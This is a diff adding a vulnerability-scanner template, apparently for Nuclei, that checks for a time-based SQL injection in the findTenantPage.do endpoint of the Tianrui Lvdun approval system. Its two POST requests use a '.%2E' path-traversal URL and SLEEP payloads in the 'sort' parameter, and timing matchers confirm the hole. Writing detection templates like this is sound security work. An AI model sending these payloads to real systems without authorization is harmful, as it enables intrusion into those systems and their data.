@@ -1,0 +1,28 @@
+id: tianrui-findTenantPage-sqli
+
+info:
+  name: 天锐绿盾审批系统 findTenantPage.do SQL注入漏洞
+  author: tianrui
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        POST /trwfe/service/.%2E/invoker/findTenantPage.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        sort=(SELECT * FROM (SELECT(SLEEP(4)))x)
+      - |
+        POST /trwfe/service/.%2E/invoker/findTenantPage.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        sort=(SELECT * FROM (SELECT(SLEEP(8)))x)
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
